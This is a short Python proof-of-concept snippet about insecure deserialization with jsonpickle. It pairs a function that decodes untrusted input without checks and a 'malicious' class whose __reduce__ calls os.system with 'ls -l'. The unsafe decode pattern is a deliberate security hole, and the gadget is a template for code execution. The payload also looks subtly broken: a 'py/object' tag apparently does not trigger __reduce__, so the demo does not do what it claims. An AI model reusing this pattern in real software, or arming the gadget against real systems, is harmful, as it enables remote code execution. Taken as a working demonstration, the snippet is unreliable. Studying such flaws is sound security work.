import jsonpickle

def vulnerable_deserialize(data):
    try:
        return jsonpickle.decode(data)
    except Exception as e:
        print(f"Error during deserialization: {e}")
        return None

malicious_payload = '{"py/object": "__main__.YourMaliciousClass"}'
class YourMaliciousClass:
    def __reduce__(self):
      import os
      return (os.system, ("ls -l",))

result = vulnerable_deserialize(malicious_payload)